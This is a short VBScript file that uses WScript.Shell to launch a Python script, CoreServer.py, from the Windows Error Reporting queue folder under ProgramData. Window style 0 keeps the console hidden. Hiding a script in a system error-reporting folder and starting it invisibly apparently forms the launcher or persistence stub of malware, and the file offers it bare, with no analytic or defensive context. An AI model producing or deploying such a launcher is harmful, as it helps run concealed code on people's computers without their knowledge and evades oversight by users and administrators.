Set oShell = CreateObject ("Wscript.Shell") 
Dim strArgs
strArgs = "cmd /c python3 C:\ProgramData\Microsoft\Windows\WER\ReportQueue\CoreServer.py"
oShell.Run strArgs, 0, false